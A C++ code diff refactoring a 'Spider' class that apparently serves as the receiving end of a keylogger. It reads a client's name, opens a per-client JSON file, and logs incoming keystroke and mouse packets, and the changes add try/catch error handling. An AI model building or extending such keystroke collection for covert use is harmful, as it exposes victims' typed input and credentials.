@@ -13,18 +13,16 @@
 
 Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web)
   : _socket(socket),
-    _web(web)
+    _web(web),
+    _json(new Json())
 {
   DEBUG_MSG("Spider created");
-  _json = new Json();
   _socket->handleError([this](){dieInDignity();});
 }
 
 Spider::~Spider()
 {
   DEBUG_MSG("Spider deleted");
-  if (_json)
-    delete _json;
 }
 
 void		Spider::dieInDignity()
@@ -50,12 +48,18 @@ void			Spider::doFirstConnection()
       _socket->async_read(_buffer.data(), sizeName, [this, sizeName]() {
       	  _buffer.getValue<char>(_str, sizeName);
 	  _name = _str;
+
+	  try {
+	    _json->openFile(_name);
+	  }
+	  catch (const std::exception &e) {
+	    std::cerr << e.what() << std::endl;
+	  }
+
 	  _buffer[0] = 1;
 	  _socket->async_write(_buffer.data(), 1, [this](){ getTypeInfo(); });
       	});
     });
-  if (_json)
-    _json->openFile(_name);
 }
 
 void			Spider::getTypeInfo()
@@ -115,8 +119,12 @@ void			Spider::getKeystrokes()
 	      std::cerr << paquet << std::endl;
 #endif // !DEBUG
 
-	      if (_json)
+	      try {
 		_json->writePaquetKeys(&paquet);
+	      }
+	      catch (const std::exception &e) {
+		std::cerr << e.what() << std::endl;
+	      }
 
 	      getTypeInfo();
 	    });
@@ -148,8 +156,12 @@ void			Spider::getMouse()
 	  std::cerr << paquet << std::endl;
 #endif // !DEBUG
 
-	  if (_json)
+	  try {
 	    _json->writePaquetMouse(&paquet);
+	  }
+	  catch (const std::exception &e) {
+	    std::cerr << e.what() << std::endl;
+	  }
 
 	  getTypeInfo();
 	});
